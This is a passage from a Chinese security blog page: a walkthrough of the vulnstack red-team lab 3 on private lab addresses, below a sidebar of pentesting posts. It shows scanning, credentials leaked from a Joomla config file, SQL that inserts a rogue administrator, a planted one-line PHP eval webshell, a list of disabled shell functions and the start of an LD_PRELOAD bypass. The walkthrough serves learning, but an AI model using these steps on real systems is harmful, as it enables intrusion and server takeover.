+            <span class="post-title" title="PHP代码审计学习1">PHP代码审计学习1</span>
+            <span class="post-date" title="2019-12-12 15:39:42">2019/12/12</span>
+        </a>
+        
+        <a  class=""
+           href="/PHP%E5%AD%A6%E4%B9%A0/"
+           data-tag="知识,PHP"
+           data-author="" >
+            <span class="post-title" title="PHP学习">PHP学习</span>
+            <span class="post-date" title="2020-01-01 23:49:08">2020/01/01</span>
+        </a>
+        
+        <a  class=""
+           href="/PWN%E4%B9%8B%E7%A8%8B%E5%BA%8F%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"
+           data-tag="CTF,PWN"
+           data-author="" >
+            <span class="post-title" title="PWN之程序常用的保护机制">PWN之程序常用的保护机制</span>
+            <span class="post-date" title="2019-12-05 15:59:05">2019/12/05</span>
+        </a>
+        
+        <a  class=""
+           href="/PWN%E5%AD%A6%E4%B9%A0/"
+           data-tag="CTF,PWN"
+           data-author="" >
+            <span class="post-title" title="PWN学习">PWN学习</span>
+            <span class="post-date" title="2019-12-04 22:13:47">2019/12/04</span>
+        </a>
+        
+        <a  class=""
+           href="/Powershell/"
+           data-tag="工具,powershell,域渗透"
+           data-author="" >
+            <span class="post-title" title="Powershell">Powershell</span>
+            <span class="post-date" title="2020-01-15 14:42:24">2020/01/15</span>
+        </a>
+        
+        <a  class=""
+           href="/Python-requests/"
+           data-tag="python"
+           data-author="" >
+            <span class="post-title" title="Python_requests模块">Python_requests模块</span>
+            <span class="post-date" title="2019-11-29 19:05:39">2019/11/29</span>
+        </a>
+        
+        <a  class=""
+           href="/Python%E5%9F%BA%E7%A1%80/"
+           data-tag="知识,python"
+           data-author="" >
+            <span class="post-title" title="Python3基础">Python3基础</span>
+            <span class="post-date" title="2019-12-23 23:14:43">2019/12/23</span>
+        </a>
+        
+        <a  class=""
+           href="/SQL%E6%B3%A8%E5%85%A5/"
+           data-tag="注入,phpmyadmin,SQL"
+           data-author="" >
+            <span class="post-title" title="SQL注入">SQL注入</span>
+            <span class="post-date" title="2019-12-01 21:45:31">2019/12/01</span>
+        </a>
+        
+        <a  class=""
+           href="/SqlServer/"
+           data-tag="数据库,mssql"
+           data-author="" >
+            <span class="post-title" title="SqlServer">SqlServer</span>
+            <span class="post-date" title="2020-05-24 19:54:32">2020/05/24</span>
+        </a>
+        
+        <a  class=""
+           href="/SSRF/"
+           data-tag="漏洞"
+           data-author="" >
+            <span class="post-title" title="SSRF">SSRF</span>
+            <span class="post-date" title="2020-01-24 11:50:18">2020/01/24</span>
+        </a>
+        
+        <a  class=""
+           href="/Struts2%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97/"
+           data-tag="漏洞,Struts2,vulhub"
+           data-author="" >
+            <span class="post-title" title="Struts2漏洞系列">Struts2漏洞系列</span>
+            <span class="post-date" title="2019-12-20 14:38:43">2019/12/20</span>
+        </a>
+        
+        <a  class=""
+           href="/Sqlmap/"
+           data-tag="工具"
+           data-author="" >
+            <span class="post-title" title="Sqlmap">Sqlmap</span>
+            <span class="post-date" title="2020-05-24 01:39:30">2020/05/24</span>
+        </a>
+        
+        <a  class=""
+           href="/Thinkphp/"
+           data-tag="漏洞,vulhub,CVE"
+           data-author="" >
+            <span class="post-title" title="Thinkphp">Thinkphp</span>
+            <span class="post-date" title="2020-03-31 20:38:23">2020/03/31</span>
+        </a>
+        
+        <a  class=""
+           href="/Tomcat/"
+           data-tag="漏洞,中间件"
+           data-author="" >
+            <span class="post-title" title="Tomcat">Tomcat</span>
+            <span class="post-date" title="2020-05-14 20:46:32">2020/05/14</span>
+        </a>
+        
+        <a  class=""
+           href="/Windows%E4%B9%8B%E8%AE%A4%E8%AF%81%E7%9F%A5%E8%AF%86/"
+           data-tag="工具,windows"
+           data-author="" >
+            <span class="post-title" title="Windows之认证知识">Windows之认证知识</span>
+            <span class="post-date" title="2020-04-19 15:08:46">2020/04/19</span>
+        </a>
+        
+        <a  class=""
+           href="/Windows%E5%AE%89%E5%85%A8/"
+           data-tag="应急响应,windows"
+           data-author="" >
+            <span class="post-title" title="Windows安全">Windows安全</span>
+            <span class="post-date" title="2020-04-10 20:48:56">2020/04/10</span>
+        </a>
+        
+        <a  class=""
+           href="/backdoors/"
+           data-tag="backdoor"
+           data-author="" >
+            <span class="post-title" title="backdoors">backdoors</span>
+            <span class="post-date" title="2019-12-14 18:13:22">2019/12/14</span>
+        </a>
+        
+        <a  class=""
+           href="/XSS/"
+           data-tag="漏洞,bypass,xss,DOM"
+           data-author="" >
+            <span class="post-title" title="XSS">XSS</span>
+            <span class="post-date" title="2019-12-18 13:24:05">2019/12/18</span>
+        </a>
+        
+        <a  class=""
+           href="/docker%E4%BD%BF%E7%94%A8/"
+           data-tag="知识"
+           data-author="" >
+            <span class="post-title" title="docker使用">docker使用</span>
+            <span class="post-date" title="2019-12-20 15:17:33">2019/12/20</span>
+        </a>
+        
+        <a  class=""
+           href="/dedecms/"
+           data-tag="漏洞,cms"
+           data-author="" >
+            <span class="post-title" title="dedecms">dedecms</span>
+            <span class="post-date" title="2020-08-14 21:16:51">2020/08/14</span>
+        </a>
+        
+        <a  class=""
+           href="/hashcat/"
+           data-tag="工具"
+           data-author="" >
+            <span class="post-title" title="hashcat">hashcat</span>
+            <span class="post-date" title="2019-12-26 11:11:09">2019/12/26</span>
+        </a>
+        
+        <a  class=""
+           href="/hexo-help/"
+           data-tag="知识"
+           data-author="" >
+            <span class="post-title" title="hexo_help">hexo_help</span>
+            <span class="post-date" title="2019-11-29 16:45:43">2019/11/29</span>
+        </a>
+        
+        <a  class=""
+           href="/phpmyadmin/"
+           data-tag="漏洞"
+           data-author="" >
+            <span class="post-title" title="phpmyadmin">phpmyadmin</span>
+            <span class="post-date" title="2020-05-17 20:08:29">2020/05/17</span>
+        </a>
+        
+        <a  class=""
+           href="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/"
+           data-tag="知识,encode_decode"
+           data-author="" >
+            <span class="post-title" title="python与编码解码">python与编码解码</span>
+            <span class="post-date" title="2020-02-03 11:53:33">2020/02/03</span>
+        </a>
+        
+        <a  class=""
+           href="/python%E5%B0%8F%E8%84%9A%E6%9C%AC/"
+           data-tag="python"
+           data-author="" >
+            <span class="post-title" title="python小脚本">python小脚本</span>
+            <span class="post-date" title="2020-02-26 10:59:03">2020/02/26</span>
+        </a>
+        
+        <a  class=""
+           href="/shell/"
+           data-tag="shell,后门"
+           data-author="" >
+            <span class="post-title" title="shell">shell</span>
+            <span class="post-date" title="2020-01-04 16:49:08">2020/01/04</span>
+        </a>
+        
+        <a  class=""
+           href="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/"
+           data-tag="靶场,vulnhub,僵尸网络"
+           data-author="" >
+            <span class="post-title" title="完结-vulnhub之Bitbot.VulnVM-disk1">完结-vulnhub之Bitbot.VulnVM-disk1</span>
+            <span class="post-date" title="2019-12-30 00:22:42">2019/12/30</span>
+        </a>
+        
+        <a  class=""
+           href="/vulnhub%E4%B9%8B21LTLTR-Scene-1/"
+           data-tag="靶场,vulnhub"
+           data-author="" >
+            <span class="post-title" title="完结-vulnhub之21LTLTR_Scene_1">完结-vulnhub之21LTLTR_Scene_1</span>
+            <span class="post-date" title="2019-12-28 21:03:12">2019/12/28</span>
+        </a>
+        
+        <a  class=""
+           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/"
+           data-tag="靶场,vulnhub"
+           data-author="" >
+            <span class="post-title" title="完结-vulnhub之LAMPSecurity-CTF5">完结-vulnhub之LAMPSecurity-CTF5</span>
+            <span class="post-date" title="2020-03-16 15:47:07">2020/03/16</span>
+        </a>
+        
+        <a  class=""
+           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF4/"
+           data-tag="靶场,vulnhub"
+           data-author="" >
+            <span class="post-title" title="完结-vulnhub之LAMPSecurity-CTF4">完结-vulnhub之LAMPSecurity-CTF4</span>
+            <span class="post-date" title="2020-03-16 14:27:30">2020/03/16</span>
+        </a>
+        
+        <a  class=""
+           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/"
+           data-tag="靶场,vulnhub"
+           data-author="" >
+            <span class="post-title" title="完结-vulnhub之LAMPSecurity-CTF6">完结-vulnhub之LAMPSecurity-CTF6</span>
+            <span class="post-date" title="2020-03-17 13:51:54">2020/03/17</span>
+        </a>
+        
+        <a  class=""
+           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/"
+           data-tag="靶场,vulnhub"
+           data-author="" >
+            <span class="post-title" title="完结-vulnhub之LAMPSecurity-CTF7">完结-vulnhub之LAMPSecurity-CTF7</span>
+            <span class="post-date" title="2020-03-18 14:49:09">2020/03/18</span>
+        </a>
+        
+        <a  class=""
+           href="/vulnhub%E4%B9%8Bchanakya/"
+           data-tag="靶场,vulnhub"
+           data-author="" >
+            <span class="post-title" title="完结-vulnhub之chanakya">完结-vulnhub之chanakya</span>
+            <span class="post-date" title="2020-12-05 21:43:10">2020/12/05</span>
+        </a>
+        
+        <a  class=""
+           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/"
+           data-tag="靶场,vulnhub"
+           data-author="" >
+            <span class="post-title" title="完结-vulnhub之LAMPSecurity-CTF8">完结-vulnhub之LAMPSecurity-CTF8</span>
+            <span class="post-date" title="2020-03-18 22:32:59">2020/03/18</span>
+        </a>
+        
+        <a  class=""
+           href="/vulnhub%E4%B9%8Bdhanush/"
+           data-tag="靶场,vulnhub"
+           data-author="" >
+            <span class="post-title" title="完结-vulnhub之dhanush">完结-vulnhub之dhanush</span>
+            <span class="post-date" title="2020-12-06 00:04:55">2020/12/06</span>
+        </a>
+        
+        <a  class=""
+           href="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80/"
+           data-tag="内网渗透,域渗透,靶场"
+           data-author="" >
+            <span class="post-title" title="完结—vulnstack红队评估一">完结—vulnstack红队评估一</span>
+            <span class="post-date" title="2021-01-03 20:11:14">2021/01/03</span>
+        </a>
+        
+        <a  class=""
+           href="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/"
+           data-tag="域渗透,靶场"
+           data-author="" >
+            <span class="post-title" title="完结——vulnstack红队评估三">完结——vulnstack红队评估三</span>
+            <span class="post-date" title="2021-01-18 20:31:30">2021/01/18</span>
+        </a>
+        
+        <a  class=""
+           href="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C/"
+           data-tag="内网渗透,域渗透,靶场"
+           data-author="" >
+            <span class="post-title" title="完结-vulnstack红队评估二">完结-vulnstack红队评估二</span>
+            <span class="post-date" title="2020-07-25 23:38:38">2020/07/25</span>
+        </a>
+        
+        <a  class=""
+           href="/webshell/"
+           data-tag="shell,webshell,内存马"
+           data-author="" >
+            <span class="post-title" title="webshell">webshell</span>
+            <span class="post-date" title="2020-05-04 23:57:34">2020/05/04</span>
+        </a>
+        
+        <a  class=""
+           href="/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%99%BE%E7%A7%91/"
+           data-tag="知识"
+           data-author="" >
+            <span class="post-title" title="信息安全百科">信息安全百科</span>
+            <span class="post-date" title="2020-03-20 23:03:55">2020/03/20</span>
+        </a>
+        
+        <a  class=""
+           href="/%E5%85%8D%E6%9D%80%E4%B8%8E%E7%BB%95%E8%BF%87/"
+           data-tag="bypass,远控,免杀"
+           data-author="" >
+            <span class="post-title" title="免杀 &amp;&amp; 绕过">免杀 &amp;&amp; 绕过</span>
+            <span class="post-date" title="2020-05-01 12:58:09">2020/05/01</span>
+        </a>
+        
+        <a  class=""
+           href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/"
+           data-tag="内网渗透"
+           data-author="" >
+            <span class="post-title" title="内网渗透之Empire">内网渗透之Empire</span>
+            <span class="post-date" title="2019-12-19 11:42:47">2019/12/19</span>
+        </a>
+        
+        <a  class=""
+           href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BLinux/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="内网渗透之Linux">内网渗透之Linux</span>
+            <span class="post-date" title="2020-10-30 16:15:14">2020/10/30</span>
+        </a>
+        
+        <a  class=""
+           href="/%E5%90%84%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/"
+           data-tag="漏洞,端口"
+           data-author="" >
+            <span class="post-title" title="各端口服务漏洞">各端口服务漏洞</span>
+            <span class="post-date" title="2019-12-17 20:27:22">2019/12/17</span>
+        </a>
+        
+        <a  class=""
+           href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/"
+           data-tag="工具,内网渗透,域渗透,windows,mimikatz"
+           data-author="" >
+            <span class="post-title" title="内网渗透之windows">内网渗透之windows</span>
+            <span class="post-date" title="2020-02-20 13:44:17">2020/02/20</span>
+        </a>
+        
+        <a  class=""
+           href="/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"
+           data-tag="知识,漏洞"
+           data-author="" >
+            <span class="post-title" title="同源策略">同源策略</span>
+            <span class="post-date" title="2020-02-02 15:18:48">2020/02/02</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"
+           data-tag="linux,提权"
+           data-author="" >
+            <span class="post-title" title="提权之Linux-环境变量">提权之Linux-环境变量</span>
+            <span class="post-date" title="2020-02-09 11:16:30">2020/02/09</span>
+        </a>
+        
+        <a  class=""
+           href="/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/"
+           data-tag="信息搜集,CDN"
+           data-author="" >
+            <span class="post-title" title="寻找网站的真实IP">寻找网站的真实IP</span>
+            <span class="post-date" title="2019-12-03 13:41:27">2019/12/03</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux/"
+           data-tag="linux,提权"
+           data-author="" >
+            <span class="post-title" title="提权之Linux">提权之Linux</span>
+            <span class="post-date" title="2020-05-24 00:58:53">2020/05/24</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8BWindows/"
+           data-tag="windows,提权"
+           data-author="" >
+            <span class="post-title" title="提权之Windows">提权之Windows</span>
+            <span class="post-date" title="2020-05-21 21:46:22">2020/05/21</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8Blinux-suid/"
+           data-tag="Linux,提权"
+           data-author="" >
+            <span class="post-title" title="提权之linux-suid">提权之linux-suid</span>
+            <span class="post-date" title="2020-04-07 21:02:38">2020/04/07</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/"
+           data-tag="windows,提权,DLL"
+           data-author="" >
+            <span class="post-title" title="提权之windows-DLL注入">提权之windows-DLL注入</span>
+            <span class="post-date" title="2020-03-23 16:52:18">2020/03/23</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-CVE-2018-8120/"
+           data-tag="提权"
+           data-author="" >
+            <span class="post-title" title="提权之windows-CVE-2018-8120">提权之windows-CVE-2018-8120</span>
+            <span class="post-date" title="2020-02-12 12:46:56">2020/02/12</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"
+           data-tag="漏洞"
+           data-author="" >
+            <span class="post-title" title="文件解析漏洞">文件解析漏洞</span>
+            <span class="post-date" title="2020-01-14 21:35:14">2020/01/14</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"
+           data-tag="知识"
+           data-author="" >
+            <span class="post-title" title="正则表达式">正则表达式</span>
+            <span class="post-date" title="2019-12-10 21:08:11">2019/12/10</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="渗透工具">渗透工具</span>
+            <span class="post-date" title="2021-01-07 22:47:15">2021/01/07</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"
+           data-tag="信息搜集"
+           data-author="" >
+            <span class="post-title" title="渗透测试之信息搜集">渗透测试之信息搜集</span>
+            <span class="post-date" title="2020-08-25 00:36:08">2020/08/25</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%BA%AF%E6%BA%90/"
+           data-tag="蓝方,防守"
+           data-author="" >
+            <span class="post-title" title="溯源">溯源</span>
+            <span class="post-date" title="2020-12-08 21:43:32">2020/12/08</span>
+        </a>
+        
+        <a  class=""
+           href="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/"
+           data-tag="工具,内网渗透,端口"
+           data-author="" >
+            <span class="post-title" title="端口转发与隧道技术">端口转发与隧道技术</span>
+            <span class="post-date" title="2020-01-05 02:38:08">2020/01/05</span>
+        </a>
+        
+        <a  class=""
+           href="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/"
+           data-tag="WAF"
+           data-author="" >
+            <span class="post-title" title="绕WAF之分块传输">绕WAF之分块传输</span>
+            <span class="post-date" title="2019-12-27 09:24:52">2019/12/27</span>
+        </a>
+        
+        <a  class=""
+           href="/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/"
+           data-tag="漏洞,editor"
+           data-author="" >
+            <span class="post-title" title="编辑器漏洞">编辑器漏洞</span>
+            <span class="post-date" title="2020-08-19 12:15:10">2020/08/19</span>
+        </a>
+        
+        <a  class=""
+           href="/%E8%84%B1%E5%A3%B3%E4%BA%8C/"
+           data-tag="MISC,逆向"
+           data-author="" >
+            <span class="post-title" title="脱壳二">脱壳二</span>
+            <span class="post-date" title="2020-01-01 15:51:38">2020/01/01</span>
+        </a>
+        
+        <a  class=""
+           href="/%E8%84%B1%E5%A3%B3/"
+           data-tag="MISC,逆向"
+           data-author="" >
+            <span class="post-title" title="脱壳一">脱壳一</span>
+            <span class="post-date" title="2019-12-26 00:13:05">2019/12/26</span>
+        </a>
+        
+        <a  class=""
+           href="/ATTACK%E5%AD%A6%E4%B9%A0/"
+           data-tag="知识,backdoor,shell"
+           data-author="" >
+            <span class="post-title" title="ATTACK学习">ATTACK学习</span>
+            <span class="post-date" title="2020-01-13 10:26:28">2020/01/13</span>
+        </a>
+        
+        <a  class=""
+           href="/Web-CheckList/"
+           data-tag="知识"
+           data-author="" >
+            <span class="post-title" title="Web-CheckList">Web-CheckList</span>
+            <span class="post-date" title="2020-10-28 15:18:44">2020/10/28</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%97%A5%E5%BF%97/"
+           data-tag="log,后渗透,FTP,日志"
+           data-author="" >
+            <span class="post-title" title="日志">日志</span>
+            <span class="post-date" title="2020-07-25 22:12:45">2020/07/25</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/"
+           data-tag="漏洞,端口"
+           data-author="" >
+            <span class="post-title" title="漏洞记录">漏洞记录</span>
+            <span class="post-date" title="2020-06-06 21:36:18">2020/06/06</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-vulnstack红队评估三" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">完结——vulnstack红队评估三</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+        <span class="tag">
+            
+            <a class="color4">域渗透</a>
+            
+            <a class="color3">靶场</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title=''>2021-01-18 20:31<br/>
+        更新时间: 2021-01-20 04:34:52
+        </time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-环境"><span class="toc-text">0x00 环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-靶机web、靶机web1"><span class="toc-text">0x01 靶机web、靶机web1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-内网渗透"><span class="toc-text">0x02 内网渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-域渗透"><span class="toc-text">0x03 域渗透</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x00-环境"><a href="#0x00-环境" class="headerlink" title="0x00 环境"></a>0x00 环境</h2><ol>
+<li><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/5/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/5/</a></li>
+<li>攻击机：192.168.111.1、192.168.111.3</li>
+<li>靶机web：192.168.111.4、192.168.93.100</li>
+<li>靶机web1：192.168.93.120</li>
+<li>靶机win7：192.168.93.30</li>
+<li>靶机win2008：192.168.93.20</li>
+<li>靶机win2012：192.168.93.10</li>
+</ol>
+<h2 id="0x01-靶机web、靶机web1"><a href="#0x01-靶机web、靶机web1" class="headerlink" title="0x01 靶机web、靶机web1"></a>0x01 靶机web、靶机web1</h2><ol>
+<li>（桥接改NAT）启动挂起状态的靶机web，重启服务重新获取IP</li>
+<li><code>service network restart</code></li>
+<li>查看当前IP</li>
+<li><code>ifconfig | grep inet</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/1.png" alt></li>
+<li>Nmap扫描：<code>nmap -Pn 192.168.111.4</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/2.png" alt></li>
+<li>访问80：</li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/3.png" alt></li>
+<li>Ubuntu（靶机web1）为nginx代理服务器（需要启动，centos的web服务才可以正常提供服务，否则会报502错误）</li>
+<li>再次访问80：得cms为joomla</li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/4.png" alt></li>
+<li>使用kali扫描：<code>joomscan -u http://192.168.111.4/</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/5.png" alt></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/6.png" alt></li>
+<li>得敏感文件泄露：<a href="http://192.168.111.4/configuration.php" target="_blank" rel="noopener">http://192.168.111.4/configuration.php</a>~ </li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/7.png" alt></li>
+<li>mysql远程登录<code>testuser/cvcvgjASD!@</code>：<code>mysql -h192.168.111.4 -u testuser -p</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/8.png" alt></li>
+<li>mysql sql语句：<pre><code>show databases;
+use joomla;
+show tables;
+select id,username,password from umnbt_users;</code></pre></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/9.png" alt></li>
+<li>得账号密码<code>admin/$2y$10$N/Yv/9rzxyq.z0gLTT5og.pj3FFAP8Sq2PcBgsMX/Qnc2671qQkHy</code></li>
+<li>不会解密码，按照官方文档添加新管理员账号：<a href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn" target="_blank" rel="noopener">https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn</a></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/10.png" alt></li>
+<li>mysql sql语句新创管理员账号admin2，密码secret<pre><code>INSERT INTO `umnbt_users` (`name`,`username`,`password`,`params`,`registerDate`,`lastvisitDate`,`lastResetTime`) VALUES (&#39;Administrator2&#39;,&#39;admin2&#39;,    &#39;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#39;,&#39;&#39;, NOW(), NOW(), NOW());
+INSERT INTO `umnbt_user_usergroup_map` (`user_id`,`group_id`) VALUES (LAST_INSERT_ID(),&#39;8&#39;);</code></pre></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/11.png" alt></li>
+<li>访问后台，登录，无法登陆。。。</li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/12.png" alt></li>
+<li>后来发现，数据库还有一个用户表：<code>select id,username,password from am2zu_users;</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/13.png" alt></li>
+<li>同语句，添加用户<pre><code>INSERT INTO `am2zu_users` (`name`,`username`,`password`,`params`,`registerDate`,`lastvisitDate`,`lastResetTime`) VALUES (&#39;Administrator2&#39;,&#39;administrator2&#39;,    &#39;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#39;,&#39;&#39;, NOW(), NOW(), NOW());
+INSERT INTO `am2zu_user_usergroup_map` (`user_id`,`group_id`) VALUES (LAST_INSERT_ID(),&#39;8&#39;);</code></pre></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/14.png" alt></li>
+<li>进入后台，Extensions————Templates——Templates</li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/15.png" alt></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/16.png" alt></li>
+<li>点击任意一个模板——new file——随意命名.php——create</li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/17.png" alt></li>
+<li>写入php代码——save</li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/18.png" alt></li>
+<li>访问链接：<a href="http://192.168.111.4/templates/protostar/shell.php" target="_blank" rel="noopener">http://192.168.111.4/templates/protostar/shell.php</a></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/19.png" alt></li>
+<li>修改php代码为一句话木马：</li>
+<li><code>&lt;?php @eval($_POST[&#39;ant&#39;]);</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/20.png" alt></li>
+<li>蚁剑连接：<a href="http://192.168.111.4/templates/protostar/shell.php" target="_blank" rel="noopener">http://192.168.111.4/templates/protostar/shell.php</a></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/21.png" alt></li>
+<li>得废shell</li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/22.png" alt></li>
+<li>存在禁用函数：disable_functions</li>
+<li><code>(exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source）</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/25.png" alt></li>
+</ol>
+<h2 id="0x02-内网渗透"><a href="#0x02-内网渗透" class="headerlink" title="0x02 内网渗透"></a>0x02 内网渗透</h2><ol>
+<li>同样道理，上传冰蝎木马</li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/23.png" alt></li>
+<li>连上：</li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/24.png" alt></li>
+<li>利用LD_PRELOAD环境变量绕过，工具脚本：<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></li>
+<li>上传bypass_disablefunc.php、bypass_disablefunc_x64.so到shell.php目录下</li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/26.png" alt></li>
